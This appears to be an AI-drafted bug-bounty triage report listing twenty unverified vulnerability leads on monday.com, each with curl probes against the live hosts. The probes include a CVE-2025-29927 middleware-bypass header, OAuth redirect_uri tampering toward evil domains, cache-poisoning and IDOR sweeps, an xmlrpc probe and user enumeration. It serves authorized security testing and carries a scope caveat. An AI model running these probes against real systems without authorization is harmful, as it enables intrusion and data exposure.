# monday.com — bug candidates, one by one

**Source:** katana crawl output only. **Nothing here is verified** — the session that
produced it cannot reach monday.com (egress proxy denies all its hosts), so no
request was ever sent to the target. Every item below is a *lead* plus the exact
command that decides whether it is real.

Read it like this: **Evidence** = what the crawl actually showed.
**Why** = the reason it might be a bug. **Verify** = run this. **Confirmed if** =
what the output has to look like for it to count.

Severities are triage estimates for a mature program. On a target like this the
easy items (xmlrpc, user enumeration, version disclosure) are usually closed as
Informational or Duplicate — the real payoff is BUG-01 to BUG-06.

---

## Run log

### Run 1 — 2026-09-06 21:12 UTC — INVALID, rate limited

Almost every check returned `429` with a 17-byte body. 17 bytes is exactly
`error code: 1015\n` — **Cloudflare rate limiting**, not a WAF block (1020) and
not a ban. The limiter counts the source IP, and a katana crawl of the same host
shortly beforehand is enough to fill the bucket on its own.

**Nothing in that run tested the application.** Every "no redirect", "no
reflection", "no methods returned" and "no difference" was the rate limiter
answering, not monday.com. Do not read results out of it.

Three things were still legible:

| | observation | status |
|---|---|---|
| BUG-15 | `strict-transport-security: max-age=31536000; includeSubDomains` — **no `preload`** | Real. Cloudflare sets this at the edge, so it is trustworthy. Makes the cleartext `http://auth.monday.com/...` links (BUG-15) slightly more than cosmetic: a client that has never visited still makes its first request in the clear. Informational-to-Low on its own. |
| BUG-08 | `view.monday.com`: no token → 200/3881 B, wrong token → 200/3914 B, real token → 200/**6062 B** | Not a bug on this evidence. The host is an SPA that returns 200 regardless; the ~3.9 KB responses are the error shell and the 6 KB one is the real board. The token looks **enforced**. Confirm by diffing the bodies, not the sizes. |
| BUG-07 | `solution_id=10005560` → 302 while its neighbours were 429 | Almost certainly "redirect to login", which is the normal response. Retest the whole sample in one un-rate-limited run before reading anything into it. |

`server: cloudflare` was the only fingerprint header returned — no `x-powered-by`,
so BUG-01 still needs a version from the framework chunk.

**Fixed in the script as a result:** a preflight rate-limit check, abort after 3
consecutive 429s, exponential backoff, response bodies saved to disk so
size-only results can be inspected, and a default pace of 4 s + jitter. Checks
that depend on a 200 now say "proved nothing" instead of reporting a false
negative.

### Run 2 — pending

```bash
DELAY=8 bash tools/verify.sh 01 02 03      # wait for the 1015 to clear first
```

---

# TIER A — worth the most if they land

## BUG-01 — Next.js middleware authorization bypass (CVE-2025-29927)

**Severity:** Critical, if the version is vulnerable · **Confidence:** untested

**Evidence:** the site runs Next.js — `/nhp/_next/static/f8386b8abfa0c30976f388dea89ed0363ecb1df0/_buildManifest.js`,
plus `webpack-`, `framework-`, `main-`, `polyfills-` chunks. Assets are served
under `/nhp` (an `assetPrefix`), pages at the root.

**Why:** Next.js versions `>=11.1.4 <14.2.25` and `>=15.0.0 <15.2.3` (also
`<13.5.9`, `<12.3.5`) accept an `x-middleware-subrequest` request header that
makes the framework skip middleware entirely. Where middleware does auth checks,
redirects, or geo/plan gating, that check disappears. It is a header, nothing else.

**Verify** — first pin the version, then test:
```bash
# version fingerprint
curl -sI https://monday.com/ | grep -i 'x-powered-by\|x-nextjs'
curl -s https://monday.com/nhp/_next/static/chunks/framework-355174a933119eba.js | grep -oE '"[0-9]+\.[0-9]+\.[0-9]+"' | head

# the bypass itself — compare a gated path with and without the header
curl -sI https://monday.com/<some-gated-path>
curl -sI https://monday.com/<some-gated-path> -H 'x-middleware-subrequest: middleware'
curl -sI https://monday.com/<some-gated-path> -H 'x-middleware-subrequest: src/middleware'
curl -sI https://monday.com/<some-gated-path> \
     -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
```

**Confirmed if:** the header changes the response — a 302/401 becomes a 200, or
gated content renders. Same status both times = not vulnerable, move on fast.

**Note:** monday.com is a large, long-running program. Assume this is patched and
spend five minutes on it, not an hour. But it costs four requests to rule out.

---

## BUG-02 — OAuth: open dynamic client registration / redirect_uri validation

**Severity:** High to Critical (account takeover class) · **Confidence:** untested

**Evidence:**
```
https://monday.com/.well-known/oauth-authorization-server   (RFC 8414)
https://monday.com/.well-known/oauth-protected-resource     (RFC 9728)
```

**Why:** the AS metadata document names the authorization, token, and — if it
exists — the **registration** endpoint, plus supported grants and PKCE support.
Two classic bugs live here: (a) dynamic client registration open to anyone, which
lets an attacker register a client with an attacker-controlled `redirect_uri`;
(b) weak `redirect_uri` matching (prefix instead of exact, subdomain wildcards,
open `state` handling) which leaks the authorization code.

**Verify:**
```bash
curl -s https://monday.com/.well-known/oauth-authorization-server | jq .
curl -s https://monday.com/.well-known/oauth-protected-resource   | jq .

# if a registration_endpoint is listed and takes an unauthenticated POST:
curl -s -X POST <registration_endpoint> \
     -H 'Content-Type: application/json' \
     -d '{"client_name":"test","redirect_uris":["https://example.org/cb"]}'
```
Then, against the real authorization endpoint, walk `redirect_uri` through the
usual set: `https://legit.monday.com.evil.tld`, `https://monday.com@evil.tld`,
`https://monday.com/path/../../evil`, an appended `%2f..%2f`, and a subdomain you
control if any is takeoverable.

**Confirmed if:** registration succeeds without auth, or the authorization
endpoint issues a code to a `redirect_uri` that is not exactly a registered one.

---

## BUG-03 — GraphQL: the full schema is published, so test field-level authorization

**Severity:** High if any mutation or field is under-protected · **Confidence:** untested

**Evidence:** `https://api.monday.com/v2/get_schema?format=sdl` — the complete SDL,
no introspection needed.

**Why:** publishing the schema is intentional and fine. What it hands you is the
list of every query, mutation, argument and deprecated field — including things
that exist in the schema but are absent from the public docs. Those are where
authorization gaps and forgotten internal fields live. Also standard for GraphQL:
alias-based batching to defeat per-request rate limits, and `@deprecated` fields
that kept the data but lost the access check.

**Verify:**
```bash
curl -s 'https://api.monday.com/v2/get_schema?format=sdl' -o schema.sdl
grep -c '' schema.sdl

# every mutation, and everything marked deprecated
grep -nE '^\s*[a-zA-Z_]+\(' schema.sdl | sed -n '1,80p'
grep -n 'deprecated' schema.sdl

# diff the schema's surface against the documented one at developer.monday.com
```
Then, with your own low-privilege token, call the interesting ones and see whether
the object you ask for has to belong to you.

**Confirmed if:** a query or mutation returns or modifies data belonging to an
account you do not own, or a rate limit is bypassed by aliasing the same field N
times in one document.

---

## BUG-04 — MCP / agent-skills surface

**Severity:** varies, up to High · **Confidence:** untested

**Evidence:**
```
https://monday.com/.well-known/mcp.json
https://monday.com/.well-known/agent-skills/index.json
https://monday.com/.well-known/api-catalog
```

**Why:** this is an MCP server exposing tool definitions to AI agents. It is the
newest surface on the domain and therefore the least tested. What to look for:
tools that perform privileged actions without a matching scope check; tool
descriptions that an attacker can influence (prompt injection into anything the
agent reads); and whether the MCP endpoint honours the OAuth scopes from BUG-02
or accepts a token minted for something else.

**Verify:**
```bash
curl -s https://monday.com/.well-known/mcp.json | jq .
curl -s https://monday.com/.well-known/agent-skills/index.json | jq .
curl -s https://monday.com/.well-known/api-catalog | jq .
```
Enumerate the tool list, map each tool to the scope it should need, then try
calling the most privileged one with the least privileged token you can mint.

**Confirmed if:** a tool executes an action the presented token's scopes do not
cover, or user-supplied content lands inside a tool description/response that an
agent will act on.

---

## BUG-05 — Cache poisoning: edge/origin URL-normalisation mismatch

**Severity:** High if a poisoned response is served to others · **Confidence:** untested

**Evidence:** Cloudflare fronts the origin (`/cdn-cgi/…` present), and the crawl
contains two malformed URLs that the site itself generated:
```
https://monday.com/partners/aws/%20        <- trailing encoded space
https://monday.com//workcanvas.com         <- double slash
```

**Why:** when the CDN and the origin disagree about what a URL means — whether
`%20` is stripped, whether `//` collapses, whether the cache key includes an
unkeyed header — you can get a response cached under a URL that other people
request. The site emitting malformed URLs of its own is a hint that normalisation
here is loose.

**Verify:**
```bash
# does the edge treat these as the same resource?
curl -sI 'https://monday.com/partners/aws/'    | grep -i 'cf-cache-status\|age\|vary'
curl -sI 'https://monday.com/partners/aws/%20' | grep -i 'cf-cache-status\|age\|vary'
curl -sI 'https://monday.com//workcanvas.com'  | grep -i 'cf-cache-status\|location'

# unkeyed header reflection — the standard first probe
curl -sI 'https://monday.com/?cb=RANDOM1' -H 'X-Forwarded-Host: evil.example' | grep -i 'cf-cache-status'
curl -s  'https://monday.com/?cb=RANDOM1' -H 'X-Forwarded-Host: evil.example' | grep -c 'evil.example'
curl -s  'https://monday.com/?cb=RANDOM1' | grep -c 'evil.example'
```

**Confirmed if:** a header you sent is reflected into a response that then comes
back `cf-cache-status: HIT` for a request that did *not* send it. **Always use a
unique cache-buster (`?cb=`) so you never poison a real URL.**

---

## BUG-06 — Next.js data endpoints leak more than the page renders

**Severity:** Medium to High depending on what comes back · **Confidence:** untested

**Evidence:** build ID `f8386b8abfa0c30976f388dea89ed0363ecb1df0` (40 hex — looks
like the deploy commit SHA), from
`/nhp/_next/static/f8386b8abfa0c30976f388dea89ed0363ecb1df0/_buildManifest.js`.

**Why:** every SSG/SSR route has a JSON twin at
`/_next/data/<buildId>/<route>.json`. It returns the raw props the page was built
from — routinely including fields the template never displays: draft flags,
internal IDs, unpublished copy, pricing experiments, employee names.

**Verify:**
```bash
BID=f8386b8abfa0c30976f388dea89ed0363ecb1df0
curl -s "https://monday.com/nhp/_next/static/$BID/_buildManifest.js" -o bm.js
grep -oE '"/[^"]*"' bm.js | tr -d '"' | sort -u > routes.txt   # every route

while read -r r; do
  echo "== $r"
  curl -s "https://monday.com/_next/data/$BID$r.json" | head -c 300; echo
  sleep 0.3
done < routes.txt
```

**Confirmed if:** the JSON contains routes or fields that are not reachable or
rendered in the normal site — unpublished pages, internal flags, PII.

---

# TIER B — solid, frequently accepted

## BUG-07 — IDOR on `solution_id`

**Severity:** Medium · **Confidence:** untested

**Evidence:** ten values, in two obvious bands, all in plain links:
```
auth.monday.com/solutions/add_solution?solution_id=
  80436  80451
  10005150  10005544  10005559  10005564  10005918  10005937  10016422  10032399
```

**Why:** short, sequential, guessable numeric IDs on an authenticated host. The
gap between the `8xxxx` and `100xxxxx` bands, and the tight clustering inside
`100055xx`, says these are sequential per-solution records. If an unpublished,
draft, or private solution sits in that range, requesting it directly is an IDOR.

**Verify** — bounded and slow, do not sweep the whole range:
```bash
for id in 10005145 10005151 10005560 10005565 10005919 10016423 80437; do
  code=$(curl -s -o /dev/null -w '%{http_code}' \
    "https://auth.monday.com/solutions/add_solution?solution_id=$id")
  echo "$id -> $code"
  sleep 1
done
```

**Confirmed if:** an ID that is not linked anywhere returns real content rather
than 404/403 — especially anything marked draft, internal, or belonging to
another account.

---

## BUG-08 — `view.monday.com` share token and `marketplace` IDs

**Severity:** Medium · **Confidence:** untested

**Evidence:**
```
https://view.monday.com/4923960784-912829ab7717efb7fb86898ff6f59cbb?r=use1
https://monday.com/marketplace/9  12  20  23  131  10000005  10000017  10000023
```

**Why:** the view URL is `<numeric board id>-<32 hex token>`. The question is
whether the token is actually required, or whether the numeric part alone
resolves. Marketplace IDs show the same two-band sequential pattern as BUG-07.

**Verify:**
```bash
# is the token enforced?
curl -s -o /dev/null -w '%{http_code}\n' 'https://view.monday.com/4923960784'
curl -s -o /dev/null -w '%{http_code}\n' 'https://view.monday.com/4923960784-00000000000000000000000000000000'
curl -s -o /dev/null -w '%{http_code}\n' 'https://view.monday.com/4923960784-912829ab7717efb7fb86898ff6f59cbb'

# marketplace: do unlinked IDs resolve?
for id in 10 11 13 21 22 24 132 10000006; do
  echo -n "$id -> "; curl -s -o /dev/null -w '%{http_code}\n' "https://monday.com/marketplace/$id"; sleep 1
done
```

**Confirmed if:** the board renders without the correct token, or unlisted
marketplace IDs return unpublished apps.

---

## BUG-09 — WordPress core is roughly two years out of date

**Severity:** Medium (Low if no exploitable CVE applies) · **Confidence:** high on the version, untested on impact

**Evidence:** WordPress stamps its own core assets with the core version, and
these are core assets:
```
/l/wp-includes/js/comment-reply.min.js?ver=6.7.1
/l/wp-includes/css/dist/block-library/style.min.css?ver=6.7.1
/l/wp-includes/js/jquery/jquery.min.js?ver=3.7.1
/l/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1
```
jQuery 3.7.1 + migrate 3.4.1 are exactly the WordPress 6.7.x defaults, which
corroborates the reading.

**Why:** WordPress 6.7.1 shipped in **November 2024**. Today is September 2026 —
about 22 months and several security releases behind, starting with 6.7.2, which
was itself a security release. A public-facing WordPress on the flagship domain,
that far behind, is worth a CVE pass.

**Caveat, state it in the report you file:** `?ver=` can be stale from a cache or
overridden, and hosts do backport patches. Confirm before claiming a CVE.

**Verify:**
```bash
curl -s https://monday.com/l/ | grep -oE 'content="WordPress [0-9.]+"'
curl -s https://monday.com/l/feed/ | grep -i generator
curl -s -o /dev/null -w '%{http_code}\n' https://monday.com/l/wp-includes/version.php
```
Then check 6.7.1 against the WPScan / WordPress security release notes and keep
only CVEs that are unauthenticated and actually reachable.

---

## BUG-10 — `word-2-html` plugin v1.0.59

**Severity:** unknown until checked · **Confidence:** high on the version

**Evidence:**
```
/l/wp-content/plugins/word-2-html/assets/dist/js/user-script.min.js?ver=1.0.59
/l/wp-content/plugins/word-2-html/assets/dist/css/user-style.css?ver=1.0.59
```
Also present: `sitepress-multilingual-cms` (WPML), theme `airfleet`.

**Why:** this is the best-shaped lead in the WordPress half. A small, obscure,
third-party plugin — pinned to an exact version — running on a flagship domain.
Obscure plugins get far less security review than core, and a plugin whose entire
job is converting Word documents into HTML is handling untrusted rich input,
which is the natural home of stored XSS and file-handling bugs.

**Verify:**
```bash
curl -s https://monday.com/l/wp-content/plugins/word-2-html/readme.txt | head -40
# then: WPScan / CVE search for "word-2-html", and diff 1.0.59 against latest
curl -s -o /dev/null -w '%{http_code}\n' https://monday.com/l/wp-content/plugins/word-2-html/
```

**Confirmed if:** a known CVE applies to 1.0.59, or the plugin exposes an
unauthenticated AJAX/REST action.

---

## BUG-11 — minify cache directory may be listable

**Severity:** Low to Medium (source disclosure) · **Confidence:** untested

**Evidence:**
```
/l/wp-content/cache/min/1/l/wp-content/themes/airfleet/dist/theme.js?ver=1785511551
/l/wp-content/cache/min/1/l/wp-content/plugins/sitepress-multilingual-cms/dist/js/browser-redirect/app.js
```

**Why:** that is an Autoptimize-style minify cache. These directories are very
often left listable, and they hold concatenated JS/CSS built from plugin internals
you cannot otherwise enumerate — including, sometimes, files from plugins that
were removed from the site but not from disk.

**Verify:**
```bash
for p in /l/wp-content/cache/min/1/ /l/wp-content/cache/min/ /l/wp-content/cache/ \
         /l/wp-content/uploads/ /l/wp-content/plugins/; do
  echo -n "$p -> "; curl -s -o /dev/null -w '%{http_code}\n' "https://monday.com$p"
done
```

**Confirmed if:** any returns 200 with an index listing rather than 403/404.

---

## BUG-12 — open redirect: `origin` parameter and `//` paths

**Severity:** Low to Medium · **Confidence:** untested

**Evidence:** an `origin` parameter on the auth host, six times:
```
auth.monday.com/users/sign_up_new?origin=hp_fullbg_page_header
auth.monday.com/p/crm/users/sign_up_new?origin=hp_fullbg_page_header
```
and protocol-relative hrefs the crawler normalised into
`https://monday.com//workcanvas.com`, `//workforms.com`.

**Why:** a parameter literally named `origin`, on the host that handles signup and
login, is the standard place a post-auth redirect target hides. And `//host`
paths test whether the router treats a leading double slash as a path or as a
scheme-relative URL — a difference between the CDN and the origin gives you a
redirect.

**Verify:**
```bash
curl -sI 'https://auth.monday.com/users/sign_up_new?origin=https://example.org'   | grep -i location
curl -sI 'https://auth.monday.com/users/sign_up_new?origin=//example.org'         | grep -i location
curl -sI 'https://auth.monday.com/users/sign_up_new?origin=https://monday.com.example.org' | grep -i location
curl -sI 'https://monday.com//example.org'                                        | grep -i location
```

**Confirmed if:** a `Location:` header points off-domain. Worth more than the
usual open-redirect payout if it chains into the OAuth flow in BUG-02.

---

# TIER C — quick, usually Informational on a program this size

## BUG-13 — `xmlrpc.php` reachable

**Severity:** Low, often Informational · **Evidence:** `/l/xmlrpc.php`, `/l/xmlrpc.php?rsd`

**Why:** `pingback.ping` gives blind SSRF and internal port scanning;
`system.multicall` packs many credential attempts into a single request, which
defeats per-request login rate limiting.

**Verify** — capability probe only, no brute force:
```bash
curl -s https://monday.com/l/xmlrpc.php \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
  | grep -oE '<string>[^<]+</string>' | head -30
```
**Confirmed if:** the method list comes back and contains `pingback.ping` or
`system.multicall`.

## BUG-14 — WordPress user enumeration

**Severity:** Informational to Low · **Evidence:** `/l/wp-json/`, `/l/wp-json/wp/v2/posts/34`, `/l/?p=34`

```bash
curl -s 'https://monday.com/l/wp-json/wp/v2/users' | jq '.[] | {id,name,slug}'
curl -sI 'https://monday.com/l/?author=1' | grep -i location
```
**Confirmed if:** usernames or author slugs come back — feeds credential stuffing
against `wp-login.php`.

## BUG-15 — cleartext `http://` links in markup

**Severity:** Informational · **Evidence:** ten of them, nine to
`http://auth.monday.com/solutions/add_solution?solution_id=…`, one to
`http://www.monday.com/terms/dpa`.

HSTS preloading covers most browsers, so this is a hygiene finding — but the
first request from a non-preloaded client leaves in cleartext, to the *auth* host.
```bash
curl -sI 'http://auth.monday.com/solutions/add_solution?solution_id=80436' | head -3
curl -sI https://monday.com/ | grep -i strict-transport-security
```

## BUG-16 — Cloudflare email obfuscation is reversible

**Severity:** Informational · **Evidence:** `/cdn-cgi/l/email-protection`,
`/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js`

The scheme is a single-byte XOR keyed on the first byte of the hex payload, and
that script is the algorithm. Any address hidden this way is recoverable:
```bash
curl -s https://monday.com/l/legal/tos/ | grep -oE 'data-cfemail="[0-9a-f]+"'
python3 -c "
h='PASTE_HEX'; k=int(h[:2],16)
print(''.join(chr(int(h[i:i+2],16)^k) for i in range(2,len(h),2)))"
```

## BUG-17 — `jquery-migrate` shipped in production

**Severity:** Informational · **Evidence:** `/l/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1`

A compatibility shim for deprecated jQuery APIs. Its presence means old jQuery
patterns are still in use somewhere on the legal site — occasionally that means a
sink like `$(location.hash)`. Worth one grep once the file is downloaded.

## BUG-18 — build ID appears to be the deploy commit SHA

**Severity:** Informational · **Evidence:** `f8386b8abfa0c30976f388dea89ed0363ecb1df0`

40 hex characters is the shape of a git SHA. Harmless alone; it confirms the build
pipeline and, more usefully, it is the key that makes BUG-06 possible.

## BUG-19 — `?r=` region parameter

**Severity:** Informational, unless it is not validated · **Evidence:**
`view.monday.com/…?r=use1`, `forms.monday.com/forms/…?r=use1`

`use1` = US East 1, implying siblings (`euc1`, `apse2`, …). Test whether it merely
selects a route or is trusted as input:
```bash
for r in use1 euc1 apse2 xxxx 'https://example.org'; do
  echo -n "$r -> "
  curl -s -o /dev/null -w '%{http_code}\n' "https://forms.monday.com/forms/9f862eef0081db8c8b6e1f9f574bdabf?r=$r"
  sleep 1
done
```

## BUG-20 — reflected-parameter sweep

**Severity:** varies · **Evidence:** the parameters this crawl actually exercised:

| param | count | where |
|---|---|---|
| `abcb` | 32 | support.monday.com article URLs |
| `selectedTag` | 19 | `/crm`, `/dev`, `/w/service` |
| `solution_id` | 10 | auth.monday.com |
| `source`, `from`, `origin` | 6 each | contact/signup flows |
| `url` | 2 | `/l/wp-json/oembed/1.0/embed?url=` |
| `r` | 2 | region |
| `format` | 2 | `get_schema?format=sdl` |
| `p` | 1 | WordPress post ID |

`selectedTag` and `abcb` are the reflection candidates — check whether the value
lands in the HTML unencoded. `url=` on the oembed endpoint is the SSRF candidate:
the `embed` endpoint is supposed to accept only local URLs, so test whether that
restriction actually holds, and whether `/wp-json/oembed/1.0/proxy?url=` exists.

```bash
curl -s 'https://monday.com/crm?selectedTag=zzqq11' | grep -c 'zzqq11'
curl -s 'https://monday.com/l/wp-json/oembed/1.0/embed?url=https://example.org/' | head -c 200
curl -s -o /dev/null -w '%{http_code}\n' 'https://monday.com/l/wp-json/oembed/1.0/proxy?url=https://example.org/'
```

---

# What I could not do, and what closes the gap

Not one of these has been tested. The JS files themselves — where hardcoded
endpoints, keys, feature flags and DOM sinks actually live — were never
downloaded, because this environment's proxy refuses every monday.com host.

To close it, run either of these where you have network, and the analysis becomes real:

```bash
bash tools/verify.sh                                    # checks BUG-01..BUG-20
python3 tools/jsrecon.py fetch -i data/js-targets-prioritised.txt -o out --maps
python3 tools/jsrecon.py analyze -i out -o reports/live --target-domain monday.com
```

Paste the output back and the unverified items above become confirmed or dead,
and the JS contents open up a class of finding that URLs alone cannot reach.

**Scope:** monday.com runs a public bug bounty. Confirm these hosts and this kind
of testing are in scope for it before sending any of these requests.
